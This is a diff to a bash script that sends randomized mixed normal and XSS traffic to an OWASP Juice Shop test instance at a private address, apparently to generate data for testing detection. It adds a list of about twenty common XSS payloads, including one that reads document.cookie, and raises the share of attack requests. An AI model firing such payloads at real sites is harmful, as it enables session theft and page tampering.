@@ -2,9 +2,7 @@
 TARGET_IP="${TARGET_IP:-100.64.0.20}"
 PORT="${PORT:-3000}"
 JUICE_URL="http://${TARGET_IP}:${PORT}"
-DURATION_SECONDS="${DURATION_SECONDS:-60}"
-END_TIME=$(( $(date +%s) + DURATION_SECONDS ))
-INTERVAL=1
+MAX_REQUESTS=200  # Fixed number of requests instead of duration
 
 ts() { date +"%Y-%m-%dT%H:%M:%S.%3N%:z"; }
 
@@ -12,11 +10,31 @@ total_requests=0
 xss_attacks=0
 normal_requests=0
 
-echo "--- Starting Randomized Mixed Traffic for ${DURATION_SECONDS} seconds ---"
+echo "--- Starting Custom Mixed Traffic for ${MAX_REQUESTS} requests ---"
 echo "Target: $JUICE_URL"
 
 # XSS attack patterns from xss_attack.sh
 xss_patterns=(
+    "<script>alert(1)</script>"
+    "<img%20src=x%20onerror=alert(1)>"
+    "<svg%20onload=alert(1)>"
+    "<iframe%20src='javascript:alert(1)'>"
+    "<a%20href='javascript:alert(1)'>Click</a>"
+    "<input%20autofocus%20onfocus=alert(1)>"
+    "<body%20onload=alert(1)>"
+    "<details%20open%20ontoggle=alert(1)>"
+    "\"><svg%20onload=alert(1)>"
+    "</textarea><script>alert(1)</script>"
+    "<img%20src=1%20onerror=prompt(1)>"
+    "<marquee%20onstart=confirm(1)>"
+    "<script>/*</script><script>alert(1)</script>"
+    "<script>''-alert(1)//</script>"
+    "<svg><script>alert(1)</script></svg>"
+    "<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>"
+    "<video%20src='invalid'%20onerror='alert(1)'>"
+    "<object%20data='javascript:alert(1)'>"
+    "<embed%20src='javascript:alert(1)'>"
+    "<form%20action='javascript:alert(1)'><input%20type='submit'></form>"
     "<img%20src=x%20onerror=alert(document.cookie)>"
     "<svg><animate%20onbegin=alert(1)>"
     "<div%20onclick=alert(1)>ClickMe</div>"
@@ -38,7 +56,6 @@ xss_patterns=(
     "<keygen%20onfocus=alert(1)>"
     "<iframe%20src='data:text/html,<script>alert(1)</script>'>"
 )
-
 
 # Normal traffic patterns
 normal_patterns=(
@@ -66,8 +83,8 @@ normal_patterns=(
 
 # Function to generate random traffic
 generate_traffic() {
-    # 30% chance of XSS attack, 70% chance of normal traffic
-    if [ $((RANDOM % 100)) -lt 40 ]; then
+    # 50% chance of XSS attack, 50% chance of normal traffic
+    if [ $((RANDOM % 100)) -lt 50 ]; then
         # XSS attack
         pattern=${xss_patterns[$((RANDOM % ${#xss_patterns[@]}))]}
         echo "[$(ts)] XSS Attack: $pattern"
@@ -83,13 +100,15 @@ generate_traffic() {
     ((total_requests++))
 }
 
-# Generate randomized mixed traffic
-while [ "$(date +%s)" -lt "$END_TIME" ]; do
+# Generate randomized mixed traffic up to MAX_REQUESTS
+while [ $total_requests -lt $MAX_REQUESTS ]; do
     generate_traffic
-    sleep "$INTERVAL"
+    # Random interval between 1 and 10 seconds
+    RANDOM_INTERVAL=$((RANDOM % 10 + 1))
+    sleep "$RANDOM_INTERVAL"
 done
 
-echo "--- Mixed traffic generation complete ---"
+echo "--- Custom mixed traffic generation complete ---"
 echo "Total requests sent: $total_requests"
 echo "XSS attacks: $xss_attacks"
 echo "Normal requests: $normal_requests"
